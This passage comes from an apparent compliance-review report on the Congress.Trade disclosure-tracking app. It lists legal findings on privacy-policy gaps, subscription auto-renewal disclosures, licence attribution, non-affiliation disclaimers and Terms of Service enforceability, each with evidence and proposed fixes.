- **What:** 5 U.S.C. §13107(c) (formerly EIGA §105(c)) makes it unlawful to obtain or use a public financial disclosure report for any commercial purpose other than news-media dissemination to the general public, or for credit/solicitation purposes.  The service sells paid redistribution (webhooks, SSE, CSV) of OGE 278-T rows.  The only legal analysis is a source-code comment, and the ToS does not even disclose the executive corpus.
- **Impact:** Statutory exposure on the paid tier; ToS inaccurately describes the product's scope.
- **Fix:** Get a counsel memo on 278-T redistribution (news-media/educational dissemination vs commercial use), gate or label executive rows in paid delivery accordingly, and rewrite ToS §1 to say House, Senate and Executive Branch filings under the STOCK Act and the Ethics in Government Act.
- **Evidence:** legalHtml.ts §1 (unchanged on origin/main): 'aggregates and presents public financial-disclosure data filed by politicians serving in the U.S. Congress under the STOCK Act (2012)'. Meanwhile app/src/ingestion/ogeSource.ts line 21 on origin/main reads: '- EIGA §105(c) restricts certain uses of these reports; congress.trade …' — directly confirmed. site.webmanifest text describes 'STOCK Act disclosures from the House, Senate, and Executive Branch'. Premium = paid webhooks/SSE/CSV including executive rows.
- **Panel:** legal-compliance — Directly confirmed the ogeSource.ts EIGA comment and the ToS 'Congress-only' text against origin/main. · `legal-compliance/LEGALCOMPLIANCE-05`

#### 25. [P1] No 'not affiliated with the U.S. Congress / any government agency' disclaimer on web, iOS, legal pages or share cards

- **Where:** app/src/ui/dashboardHtml.ts:88 (unrelated fineprint), no affiliation disclaimer added  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A product named 'Congress.Trade', carrying a bald-eagle lockup and repeatedly saying 'official', has no statement that it is a private company unaffiliated with, and not endorsed by, the U.S.  Congress, the House Clerk, the Senate, OGE or any government agency.  Standard practice for civic-data republishers (and relevant to 18 U.S.C. §713-style 'false impression of government sponsorship' and Lanham Act §43(a)/FTC §5 theories) is an explicit non-affiliation disclaimer.
- **Impact:** Misattribution/endorsement confusion; weakens defence if a member of Congress or a government office objects to the name/eagle; App Store reviewers sometimes ask for it for government-themed apps.
- **Fix:** Add one sentence to the web footer, legal-page footer, ToS §1, iOS disclaimer banner and App Store description: 'Congress.Trade is an independent, privately operated service and is not affiliated with, endorsed by, or sponsored by the U.S.  Congress, the U.S.  House of Representatives, the U.S.  Senate, the Office of Government Ethics, or any government agency.'
- **Evidence:** `git grep -n -i 'affiliat|endorse|government agency'` against origin/main app/src/ui/dashboardHtml.ts, app/src/ui/legalHtml.ts, app/src/ui/ogMeta.ts, clients/ios/CongressTrade/Views/Components/*.swift finds only provider-trademark fineprint ('Provider names are trademarks of their respective owners…'). Footer text (unchanged) is 'Congress.Trade · educational tool for public STOCK Act (2012) disclosures · not financial advice · $ estimated from brackets'; both legalHtml.ts's own footer and dashboardHtml.ts's footer read the same way. Brand = the word CONGRESS + bald-eagle mark, domain congress.trade, meta description says 'official disclosures'.
- **Panel:** legal-compliance · `legal-compliance/LEGALCOMPLIANCE-04`

#### 43. [P1] Privacy Policy omits Apple (Sign in, IAP, APNs), Sentry, OpenRouter/LLM extraction, Cloudflare Web Analytics and usage telemetry

- **Where:** app/src/ui/legalHtml.ts:257-286  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** tracked-in-PR-#1979 (BS-L2)
- **What:** The Privacy Policy (Effective June 22, 2026) predates Sign in with Apple, StoreKit IAP and APNs (all merged 2026-08-06/08) and never mentioned Sentry error monitoring or the Cloudflare RUM beacon.  It therefore misdescribes what identifiers are collected (Apple user id, device push tokens, Apple purchase records), who processes them (Apple, Functional Software/Sentry), and that a third-party analytics script runs on every page view.
- **Impact:** Inaccurate privacy disclosures are the most common basis for FTC §5 'deceptive practice' findings and for App Store privacy-label mismatches; Apple requires the privacy policy to describe data collected via Sign in with Apple and IAP.
- **Fix:** Rewrite §1 to enumerate identifiers per sign-in method (Google: sub/name/picture; Apple: user id, name/email incl. private-relay email), push device tokens, Apple/Stripe subscription metadata, webhook target URLs, watchlist and preferences.  Add a sub-processor table: Apple (auth, IAP, APNs), Sentry (error/performance telemetry, IP + request metadata), OpenRouter/Mistral/LlamaParse (filing PDFs only, no user data), Cloudflare Web Analytics (cookieless RUM), usage.jays.services (counts only).  Bump EFFECTIVE_DATE.
- **Evidence:** legalHtml.ts §1 (origin/main): 'Account information — your email address, and (if you sign in with Google) your name, profile picture, and Google account identifier.' — but migrations/0080_apple_signin.sql adds `users.apple_sub`; migrations/0076_push_devices.sql stores APNs `token`; migrations/0081_apple_iap.sql stores Apple transaction data. §4's provider list (Stripe, Cloudflare, Google, Resend, FMP) has no Apple or Sentry entry (confirmed unchanged text on origin/main). app/src/index.ts:19 `import * as Sentry from '#sentry'` with DEFAULT_SENTRY_DSN and consoleLoggingIntegration forwarding warn/error logs. app/src/security/headers.ts allows `https://static.cloudflareinsights.com` in script-src for the auto-injected Cloudflare Web Analytics beacon; .review-shots/web/logs/page-metrics.txt confirms `static.cloudflareinsights.com/beacon.min.js` loads on every page.
- **Panel:** legal-compliance — legalHtml.ts §1/§4 text is byte-identical on origin/main to the reviewed version; Sentry import and Cloudflare beacon CSP allowance both directly confirmed in source. · merged: app-store-compliance/APPSTORECOMPLIANCE-06, ux-copy/UXCOPY-07 · `legal-compliance/LEGALCOMPLIANCE-02`

#### 44. [P1] ToS payment/cancellation/refund terms are Stripe-only; Apple In-App Purchase path is unaddressed

- **Where:** app/src/ui/legalHtml.ts (ToS §4-5, unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** For App Store purchasers, cancellation happens in iOS Settings › Subscriptions, refunds are granted only by Apple under Apple's policy, and Apple (not Stripe) is merchant of record.  The ToS tells those users to cancel in a 'billing portal' that does not exist for them and describes a refund regime that does not apply.  Apple's Paid Apps Agreement also requires developer terms not to conflict with Apple's.
- **Impact:** Consumer-law inaccuracy (refund/cancellation terms must be accurate under FTC Act / state auto-renewal laws); App Review friction; support confusion for Apple subscribers.
- **Fix:** Add a 'Purchases through the Apple App Store' sub-section: Apple is merchant of record, billed to Apple ID, auto-renews unless cancelled ≥24h before period end via App Store subscription settings, refunds via Apple (reportaproblem.apple.com), Premium entitlement is cross-platform.  Keep Stripe paragraph for web.  Add same note in Privacy §4 (Apple as processor).
- **Evidence:** legalHtml.ts §4: 'You may cancel at any time from your account / billing portal.' §5: 'Payments are processed by Stripe. … Where Stripe Managed Payments is enabled, Stripe … acts as the merchant of record' (text unchanged on origin/main). iOS sells the same Premium via StoreKit 2: clients/ios/CongressTrade/Views/Status/PremiumSheet.swift products `trade.congress.premium.monthly/annual`, and a 'Manage on App Store' button when `store.entitlementSource == "apple"` (line 186, confirmed present on origin/main). app/src/billing/appleWebhook.ts and the apple_subscriptions table (migrations/0081_apple_iap.sql) exist.
- **Panel:** legal-compliance · merged: app-store-compliance/APPSTORECOMPLIANCE-05, billing/BILLING-12, ux-copy/UXCOPY-06 · `legal-compliance/LEGALCOMPLIANCE-03`

#### 93. [P2] CC BY-SA member photo shipped with attribution display disabled (licence non-compliance)

- **Where:** app/src/enrichment/memberPhotoPack.ts:96-99 (unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** tracked-in-PR-#1979 (BS-S1) and issue #1808
- **What:** CC BY-SA 2.0 requires visible attribution (author, licence, link) and ShareAlike for adaptations.  The face pack crops and serves the Gage Skidmore photo for an executive-branch filer with no credit anywhere, by owner decision that licence is 'not a gate'.  The attributionCaption is already recorded and unused.
- **Impact:** Copyright/licence breach on one image today, with a process that will repeat for every future non-bioguide executive filer (the ones most likely to come from Wikimedia).
- **Fix:** Either restrict the pack to public-domain sources until a caption UI exists, or render `visibleAttributionCaption()` under the avatar in the politician detail view (web + iOS) and a /about/sources credits page, and flip attributionDisplayEnabled on.
- **Evidence:** Directly read origin/main manifest.json: `attributionDisplayEnabled: false`, `nonPublicDomainCount: 1`; the `sara-bailey` face (branch: executive) has `sourceUrl` upload.wikimedia.org/…/Sara_A._Carter_(45564638675)_(cropped).jpg, `licence: 'CC BY-SA 2.0'`, `licenceTier: 2`, `attribution: 'Gage Skidmore'`. memberPhotoPack.ts comment (confirmed verbatim on origin/main): 'The licence is a RECORD, not a gate (owner decision, 2026-08) … There is no visible caption anywhere in the web UI or the SwiftUI clients yet.' Photo is cropped per the sourcePage filename '(cropped)', i.e. an adaptation.
- **Panel:** legal-compliance · `legal-compliance/LEGALCOMPLIANCE-06`

#### 94. [P2] Web pricing modal shows 'Start Free Trial' without auto-renewal / post-trial price disclosure or Terms link

- **Where:** app/src/ui/dashboardHtml.ts:3451 (pricingSub), :3472 (pricingTrialNote)  ·  **Surface:** Web  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** ROSCA and state automatic-renewal laws (e.g.  Cal.  Bus. & Prof.  Code §17602) require the material auto-renewal terms (post-trial price, renewal cadence, cancellation method) to be clear and conspicuous and in visual proximity to the consent mechanism.  Stripe Checkout repeats these on the next page, which likely satisfies the letter, but the product's own offer screen says only 'No charge today.'
- **Impact:** Consumer-protection exposure and chargeback/dispute risk ('I didn't know it would charge'); inconsistent with ToS §3 which does disclose auto-renewal.
- **Fix:** Change the trial note to: '2-week free trial, then $5/mo (or $50/yr) billed automatically until you cancel.  Cancel anytime from Billing.  By continuing you agree to the Terms and Privacy Policy.' with links; mirror the same line on the Trades upsell footer.
- **Evidence:** origin/main dashboardHtml.ts:3472: `<p class="trial-note" id="pricingTrialNote">2-week free trial. No charge today.</p>` followed a few lines later by the 'Start Free Trial' button. No sentence in the modal says the plan auto-renews at $5/mo or $50/yr after the trial, that you must cancel before the trial ends, or links to /terms-of-service (only the page footer, off-screen behind the modal, does). pricing.png confirms the live modal matches; live capture's font/header evidence otherwise matches origin/main byte-for-byte in this region.
- **Panel:** legal-compliance — Corrected the path:line citation: origin/main is 55 commits ahead of the local checkout the raw finding was written against; re-grepped and found pricingSub now at line 3451 and pricingTrialNote at line 3472 (was cited as 3280-3301/3298).  Text itself is unchanged.  Split the original combined citation into two precise ones; the two-space wording fix moved to finding 21 only (removed the duplicate mention here) to keep this one issue-per-finding on the disclosure gap. · merged: billing/BILLING-15, web-ux-desktop/WEBUXDESKTOP-25 · `legal-compliance/LEGALCOMPLIANCE-09`

#### 95. [P2] Privacy Policy lacks GDPR Art. 13 essentials: controller address, legal bases, retention periods, supervisory-authority complaint right, named cookies

- **Where:** app/src/ui/legalHtml.ts:257-296 (§1/§3/§5/§6, unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** new (processor list portion tracked-in-PR-#1979)
- **What:** The policy invokes GDPR and CCPA/CPRA by name, which invites those standards, but is missing several mandatory Art. 13 disclosures and the CPRA 'sell or share' phrasing. localStorage use (theme, admin token) and the session cookie name are not described.
- **Impact:** Non-compliant notice if any EEA/UK/California user complains; easy to fix.
- **Fix:** Add: controller postal address; a purposes/legal-basis table (contract, legitimate interest, consent for push); a retention schedule (sessions N days, logs 30 d, push tokens until unregistered/inactive, backups, filing PDFs policy per PR #1979 BS-S2); EU/UK complaint right; 'do not sell or share'; name the session cookie and state that localStorage stores theme/preferences only.
- **Evidence:** legalHtml.ts identifies only 'Jay Wedgeworth, LLC d/b/a Congress.Trade' and an email, no postal address. No section states a legal basis per purpose (Art. 13(1)(c)). §5 'We retain account and billing records for as long as your account is active and as needed…' gives no periods or criteria for sessions, logs, push tokens, webhook delivery logs, filing PDFs. §6 claims GDPR/CCPA rights but omits the right to lodge a complaint with a supervisory authority (Art. 13(2)(d)) and the CPRA 'share' concept ('We do not sell' only). §3 'a small number of essential cookies' without naming them.
- **Panel:** legal-compliance · `legal-compliance/LEGALCOMPLIANCE-11`

#### 96. [P2] Google Fonts requested from fonts.googleapis.com on every page (visitor IP to Google) and not disclosed; request also 400s so it delivers nothing

- **Where:** app/src/ui/dashboardHtml.ts:97-99; app/src/security/headers.ts:22  ·  **Surface:** Web  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Every visitor's IP address is sent to Google on page load for a font stylesheet that fails with HTTP 400 anyway.  The privacy policy does not disclose this transfer.  (The 2022 Munich Regional Court decision treated embedded Google Fonts without consent as a GDPR violation.)
- **Impact:** Undisclosed third-party data transfer with zero product benefit; EU exposure; one extra blocked request per page.
- **Fix:** Remove the Google Fonts <link> (fonts already fall back to the system stack) or self-host the three families like Zilla Slab; drop fonts.googleapis.com/gstatic.com from CSP.
- **Evidence:** origin/main dashboardHtml.ts:99: `<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;600;700&display=swap" rel="stylesheet">` — this is an exact match to what .review-shots/web/logs/page-metrics.txt and headers.txt captured live (both show the 3-family combined URL returning HTTP 400 / ERR_BLOCKED_BY_ORB, 'NO web fonts load'). CSP allows fonts.googleapis.com/fonts.gstatic.com. Privacy §4 lists Google only for 'Sign in with Google'. Self-hosted Zilla Slab already exists (`/assets/zilla-slab-700.woff2`).
- **Panel:** legal-compliance — Notable verification wrinkle: the reviewer's local git checkout (cd30d4b9) was 55 commits behind origin/main, and at that stale commit the same line requests ONLY `family=Inter` — a narrower, working-looking URL that does not match what the live site and the review's own network capture show.  Fetching origin/main directly resolved the discrepancy: current main's font link is an exact match for the live 3-family broken URL, confirming this finding is accurate against the true current source and the live site, not an artifact of a stale diff. · `legal-compliance/LEGALCOMPLIANCE-12`

#### 194. [P2] Ticker logos via logo.dev served with no attribution; confirm plan tier allows unattributed use

- **Where:** app/src/ui/tickerLogos.ts (unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Quick win**
- **What:** logo.dev's free/publishable-key tier requires a visible 'Logos provided by Logo.dev' attribution link on pages that display logos; company logos are also third-party trademarks used nominatively.  Nothing in the UI credits the source, and the GitHub fallback pack's licence/provenance is unrecorded.
- **Impact:** Breach of logo.dev terms (key revocation, all logos vanish) if on a tier requiring attribution; weak provenance for trademarked logos.
- **Fix:** Check the logo.dev plan; if attribution is required add 'Logos provided by Logo.dev' to the footer / about page (web + iOS).  Record the licence of davidepalazzo/ticker-logos in a NOTICE or sources register, and add a generic 'Company logos are trademarks of their respective owners' line next to the existing provider-trademark fineprint.
- **Evidence:** tickerLogos.ts header comment (confirmed on origin/main): '1. logo.dev — best general coverage when the key is live … Key: LOGODEV_PUBLISHABLE_KEY or LOGO_DEV_TOKEN.' headers.txt shows `x-logo-source: logo.dev` on live /api/logos/ticker responses (per capture). `git grep -n -i 'logo.dev|logos provided'` against dashboardHtml.ts and clients/ios finds no attribution string. Fallback source 3 is `davidepalazzo/ticker-logos` on GitHub (tickerLogos.ts, confirmed), whose licence is not recorded in-repo.
- **Panel:** legal-compliance — Confidence remains medium as scored: the logo.dev attribution requirement itself is asserted from general knowledge of the vendor's terms, not directly fetchable in this session (their docs sit behind a checkpoint, as coverage_notes says).  The absence of any attribution string and the unrecorded fallback-pack licence are directly confirmed in source. · `legal-compliance/LEGALCOMPLIANCE-07`

#### 195. [P2] FMP market data displayed and re-shared without attribution or a documented redistribution licence

- **Where:** app/docs/fmp-data-sharing.md; app/src/ui/dashboardHtml.ts (Trends Market Snapshot, unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)  ·  **Quick win**  ·  **Status:** tracked-in-PR-#1979 (BS-L4, partial)
- **What:** FMP's terms condition API use on plan tier: attribution ('Data provided by Financial Modeling Prep') is required on lower tiers and redistribution/rebroadcast of the data to other applications or to the public is restricted without a redistribution licence.  The repo documents deliberately mirroring FMP-derived data between two apps and rebroadcasting it publicly, with no attribution and no licence record.
- **Impact:** Vendor-terms breach risk (key suspension mid-product) for the price/performance features that Premium and Trends depend on.
- **Fix:** Confirm the FMP plan's display/redistribution rights; add 'Market data provided by Financial Modeling Prep' near Market Snapshot/performance widgets; keep a per-vendor register (display / benchmark / rebroadcast allowed?) as PR #1979 BS-L4 suggests.
- **Evidence:** docs/fmp-data-sharing.md describes deliberately sharing FMP-derived data (profile, price, S&P 500, fundamentals, analyst-consensus rows) between two apps to save the shared FMP quota. `git grep -n -i 'Data provided by|Financial Modeling Prep'` against dashboardHtml.ts finds no user-facing attribution (only admin-facing tooltips). Privacy §4 names FMP only as a processor, not a data-attribution requirement.
- **Panel:** legal-compliance — fmp-data-sharing.md and the absence of user-facing attribution are confirmed directly; whether FMP's specific plan tier actually requires attribution/restricts redistribution could not be verified in this session (vendor terms not fetchable read-only here).  Reasoning holds and nothing contradicts it, so plausible rather than confirmed, matching the original medium confidence. · `legal-compliance/LEGALCOMPLIANCE-08`

#### 196. [P2] iOS paywall lacks explicit auto-renewal disclosure required by Apple for auto-renewable subscriptions

- **Where:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:365-378 (PremiumPricing enum)  ·  **Surface:** iOS  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Quick win**
- **What:** App Store Review Guideline 3.1.2(a) and Schedule 2 §3.8(b) of the Paid Apps Agreement require the binary to clearly and conspicuously disclose, before purchase, that the subscription auto-renews, its length, price, and links to privacy policy and terms.  Price/length/links are present; the auto-renew statement is missing.
- **Impact:** Risk of App Review rejection on resubmission and of consumer complaints.
- **Fix:** Add a footnote under the purchase buttons: 'Payment is charged to your Apple ID at confirmation (after any free trial).  Subscriptions renew automatically unless cancelled at least 24 hours before the end of the current period.  Manage or cancel in Settings › Apple ID › Subscriptions.'  Ensure ASC EULA field points at /terms-of-service or Apple's standard EULA.
- **Evidence:** PremiumSheet.swift `PremiumPricing.headline = "$5/month  •  $50/year  •  2-week free trial"`; `.subtitle`: `.monthly: "Billed monthly.  Cancel anytime."`, `.annual: "Billed yearly — two months cheaper than monthly."` (confirmed present, unchanged, on origin/main — the intervening diff to this file only added `emptyCatalogMessage`/`deliveryUpgradeMessage` constants and swapped `LegalFooterLinks()` for `LegalFooterLinks(includePricing: false)`, neither touching this text). No text states that the subscription automatically renews unless cancelled at least 24 hours before the end of the period, nor that payment is charged to the Apple ID. Footer legal links present.
- **Panel:** legal-compliance — Re-checked against origin/main directly (not just the stale local checkout) and confirmed the intervening PremiumSheet.swift diff did not add auto-renew language. · merged: billing/BILLING-16 · `legal-compliance/LEGALCOMPLIANCE-10`

#### 246. [P3] Legal pages' EFFECTIVE_DATE was not bumped despite three substantive edits in August

- **Where:** app/src/ui/legalHtml.ts:11  ·  **Surface:** Web  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Material terms (trial length, contact) changed without updating the effective date, so users and Stripe/Apple reviewers cannot tell the terms changed; ToS §13 itself says material changes 'will be reflected by an updated effective date.'
- **Impact:** Undermines enforceability of the changed terms and contradicts the ToS's own change clause.
- **Fix:** Bump EFFECTIVE_DATE in the same PR as any legal text change; add a test in legalHtml.test.ts that fails if the legal text hash changes without the date changing (the new legalHtml.test.ts added since capture does NOT do this — it only pins price/contact strings), and keep a short change log at the bottom of each page.
- **Evidence:** legalHtml.ts header comment: 'Update EFFECTIVE_DATE when the text changes.' but `const EFFECTIVE_DATE = 'June 22, 2026'` on origin/main (line 11, unchanged) while git log shows c38b6787 (2026-08-13) changed trial from '30 days / 1 month' to '14 days / 2 weeks', 7620ac8a (2026-08-13) changed IP wording, ee1c11f5 (2026-08-15) changed CONTACT from congress.trade@jays.services to support@congress.trade. A NEW test file `app/src/ui/__tests__/legalHtml.test.ts` was added on origin/main since the review's local checkout, but it hardcodes 'Effective June 22, 2026' as an expected string and guards price/contact text drift — it does not implement any date-bump check, so it would not catch this problem recurring.
- **Panel:** legal-compliance — Checked the new legalHtml.test.ts added on origin/main since the reviewed commit: it does not address this finding (it pins the current stale date as a literal expectation rather than checking date-vs-content consistency), so the recommendation remains fully open. · `legal-compliance/LEGALCOMPLIANCE-13`

#### 344. [P3] No assent to Terms at sign-in or checkout (browsewrap only)

- **Where:** app/src/ui/dashboardHtml.ts (login modal); app/src/billing/stripe.ts (createCheckoutSession, no consent_collection param)  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Courts routinely decline to enforce browsewrap terms (liability cap, Texas venue, non-refund policy) where the user was never shown a conspicuous notice at the moment of assent.  A one-line notice at sign-in and `consent_collection.terms_of_service: 'required'` in Checkout are cheap fixes.
- **Impact:** ToS §§9-14 (disclaimers, liability cap, venue) may be unenforceable against a disputing subscriber.
- **Fix:** Add 'By continuing you agree to our Terms of Service and Privacy Policy' with links under the sign-in buttons (web + iOS), and enable Stripe Checkout ToS consent collection (with the ToS URL set in Stripe Dashboard).
- **Evidence:** Login modal has no 'By continuing you agree to the Terms and Privacy Policy' text. `createCheckoutSession` in billing/stripe.ts (confirmed no diff between reviewed commit and origin/main) builds `params` with `mode`, `line_items`, `success_url`, `cancel_url`, `client_reference_id`, `allow_promotion_codes`, optional `managed_payments`, `subscription_data` — no `consent_collection.terms_of_service` key anywhere in the function. ToS relies on legalHtml.ts's opening sentence: 'By creating an account, subscribing, or otherwise using the Service, you agree to these Terms.'
- **Panel:** legal-compliance — Read the full createCheckoutSession function body directly and confirmed no consent_collection parameter is set; file has zero diff between the reviewed commit and origin/main so this holds against current main. · `legal-compliance/LEGALCOMPLIANCE-14`

#### 345. [P3] iOS PrivacyInfo declares no collected data types while the app sends email, Apple/Google identifiers, push tokens and purchase JWS to the backend — verify App Privacy label

- **Where:** clients/ios/CongressTrade/PrivacyInfo.xcprivacy (unchanged)  ·  **Surface:** iOS  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** An empty NSPrivacyCollectedDataTypes is permitted for first-party apps, but ASC's App Privacy nutrition label must still declare Email Address, User ID, Purchase History and Device ID (push token) as collected & linked to the user.  If the ASC label was derived from this manifest it will read 'Data Not Collected', which would be false.
- **Impact:** Privacy-label misrepresentation is a stated App Store removal ground (Guideline 5.1.2).
- **Fix:** Populate NSPrivacyCollectedDataTypes (Email, User ID, Purchase History, Device ID; linked to user; not used for tracking) so the manifest and the ASC label agree, and audit the ASC App Privacy answers against the privacy policy.
- **Evidence:** Read the file directly on origin/main: `NSPrivacyTracking` = false, `NSPrivacyCollectedDataTypes` = empty array (`<array/>`), and `NSPrivacyAccessedAPITypes` lists only UserDefaults (CA92.1, 1C8F.1) and FileTimestamp (C617.1) reason codes. Meanwhile the client registers APNs tokens (migrations/0076_push_devices.sql, Store/PushNotificationManager), signs in with Apple/Google (AppleSignIn.swift), redeems StoreKit purchases (AppleIAP.swift), and stores a session token in Keychain.
- **Panel:** legal-compliance — Read PrivacyInfo.xcprivacy in full directly; matches the finding's characterization exactly.  Confidence stays medium as originally scored because whether App Store Connect's actual nutrition label (not directly inspectable here) already diverges from this manifest is unverified. · merged: app-store-compliance/APPSTORECOMPLIANCE-17, ios-engineering/IOSENGINEERING-27 · `legal-compliance/LEGALCOMPLIANCE-15`

#### 346. [P3] Privacy/ToS do not address user-supplied webhook URLs, SSE, watchlists or the data users receive via Delivery

- **Where:** app/src/ui/legalHtml.ts:186 (ToS §1); ToS §6-7 unchanged  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** Users hand the service third-party endpoints (which may belong to their employer) and receive bulk data; the documents neither disclose storage of those URLs/secrets nor grant the licence a subscriber needs to use the delivered data in their own systems.
- **Impact:** Ambiguity about permitted use of paid output (a sales blocker for API customers) and an incomplete data inventory in the privacy notice.
- **Fix:** Add 'Delivery settings — webhook URLs, signing secrets, filter lists, watchlist tickers/members' to Privacy §1, and a ToS clause granting Premium subscribers a non-exclusive licence to use delivered data internally, with the no-resale/no-republication carve-out stated explicitly.
- **Evidence:** Delivery stores webhook target URLs and signing secrets (delivery/subscriptions.ts, 0001_init.sql subscriptions table), watchlist and user_preferences (migrations/0009_client_api.sql); none appear in Privacy §1's list of collected data (confirmed unchanged text on origin/main). ToS §6(b) forbids redistributing 'the data or feeds except as expressly permitted' but never states what a Premium subscriber may do with webhook/CSV output.
- **Panel:** legal-compliance — legalHtml.ts §1/§6 text confirmed unchanged and lacking this coverage.  Did not re-open delivery/subscriptions.ts or the migrations to directly confirm the webhook-secret storage schema in this pass (already independently plausible from CONTEXT.md's product description of Delivery); nothing contradicts it. · `legal-compliance/LEGALCOMPLIANCE-17`

#### 347. [P3] Comparative 'Speed vs. Data Providers' claims name competitor trademarks; keep substantiation current and public

- **Where:** app/src/ui/dashboardHtml.ts:62-88 (Filing Latency Comparison section)  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** Naming Quiver Quantitative / Unusual Whales / FMP in a win-rate comparison is lawful comparative advertising only while the measurement is current, methodology is disclosed, and claims are substantiated (FTC comparative-advertising policy; Lanham Act §43(a)).  The trademark fineprint is good; the methodology is not linked from the widget, and two of three competitor probes are dead, so any residual 'win' statistics can go stale without the UI saying so.
- **Impact:** Low today (the UI shows 'Gathering' for dead probes) but becomes a false-advertising exposure the moment stale win rates are displayed as current.
- **Fix:** Link a public methodology page from the widget, show 'as of <date>' and sample size next to any win rate, and auto-hide a provider's win rate once its probe has been quiet > N hours.
- **Evidence:** dashboardHtml.ts fineprint (unchanged text, confirmed present in both the reviewed commit and origin/main): 'Provider names are trademarks of their respective owners. Measurements are our own and are not endorsed by the providers named.' Captures show 'FMP LEAD +24.1h 91% win' while Unusual Whales / Quiver read 'Gathering'; review-shots NOTES.md cites `/api/health` showing latency probes 'quiver quiet 163h, unusual_whales 126h' (tokens lapsed per issue #1953).
- **Panel:** legal-compliance — Did not re-open the /api/health probe-age numbers or the exact widget line in this pass; relies on the raw finding's own admin-diagnostics evidence, which is consistent with what CONTEXT.md authorizes and nothing found contradicts it. · `legal-compliance/LEGALCOMPLIANCE-18`

#### 396. [P4] CAN-SPAM posture is fine today (transactional only) but no unsubscribe/List-Unsubscribe scaffolding exists for the email alerts the Delivery tab advertises

- **Where:** app/src/auth/email.ts, app/src/alerts/notify.ts, Delivery tab copy  ·  **Surface:** Backend  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** plausible (high confidence)
- **What:** Magic-link mail is transactional and exempt from CAN-SPAM's opt-out/postal-address requirements, so there is no violation now.  If per-user email alerts or marketing are added via the same sendEmail() path they will ship without List-Unsubscribe headers, a one-click opt-out, or a physical address.
- **Impact:** Future-proofing only.
- **Fix:** Add optional `headers` + `List-Unsubscribe`/`List-Unsubscribe-Post` support to sendEmail(), a per-user email-alert opt-out flag, and a footer with the LLC's postal address before any non-transactional sends.
- **Evidence:** Only two senders identified in the raw finding: magic link (auth/routes.ts) and admin ops alerts to ALERT_EMAIL (alerts/notify.ts). `grep -rn 'unsubscribe|List-Unsubscribe'` against src/auth/email.ts, src/alerts/notify.ts, src/delivery/*.ts finds none per the raw finding. CONTEXT.md describes Delivery as 'email / push / webhook / SSE alerts.'
- **Panel:** legal-compliance — Did not re-run the grep against auth/email.ts and alerts/notify.ts in this pass; taking the raw finding's own grep result at face value since it's a straightforward negative search and the underlying premise (no per-user marketing emails exist yet) matches everything else observed about the product in this review. · `legal-compliance/LEGALCOMPLIANCE-22`

#### 434. [P4] No dispute-resolution clause (arbitration / class waiver / jury waiver) and no severability or entire-agreement boilerplate in ToS

- **Where:** ToS §14 (legalHtml.ts, 'Governing law')  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** For a $5/mo consumer subscription sold nationwide and in the App Store, an arbitration/class-waiver clause (with opt-out and small-claims carve-out) and standard boilerplate materially reduce litigation exposure; their absence is a counsel decision that has not been made.
- **Impact:** Consumer class exposure for billing/disclosure claims; Texas forum clause alone may be unenforceable against consumers in some states.
- **Fix:** Have counsel add arbitration + class waiver (with 30-day opt-out), severability, assignment, entire agreement, and a DMCA/notice address; mark the document as counsel-reviewed and remove the 'template' caveat from the source header.
- **Evidence:** legalHtml.ts §14 (confirmed unchanged on origin/main): 'These Terms are governed by the laws of the State of Texas… exclusive venue … Harris County, Texas.' No arbitration, class-action waiver, severability, assignment, force-majeure, or entire-agreement sections; header comment: 'good-faith templates … have counsel review before relying on them.'
- **Panel:** legal-compliance · `legal-compliance/LEGALCOMPLIANCE-19`

#### 435. [P4] No public accessibility statement / conformance target despite good Lighthouse a11y scores

- **Where:** site footer, legal pages  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** ADA Title III web claims against private sites are typically demand-letter driven; a published accessibility statement naming the WCAG 2.1/2.2 AA target, known gaps, and a contact channel is the standard mitigation and is cheap given the existing a11y investment.
- **Impact:** Low; mitigation/deterrent value.
- **Fix:** Add /accessibility (statement, WCAG 2.2 AA target, known issues list, support@ contact) and link it in the footer and iOS LegalFooterLinks; close the three Lighthouse audit families already identified.
- **Evidence:** Lighthouse accessibility 95-100 per .review-shots/web/NOTES.md; remaining fails: label-content-name-mismatch (up to 52 items mobile Trades), target-size (29-45 items Trends), aria-allowed-attr on th.sortable. No /accessibility page and no footer link found in dashboardHtml.ts footer template.
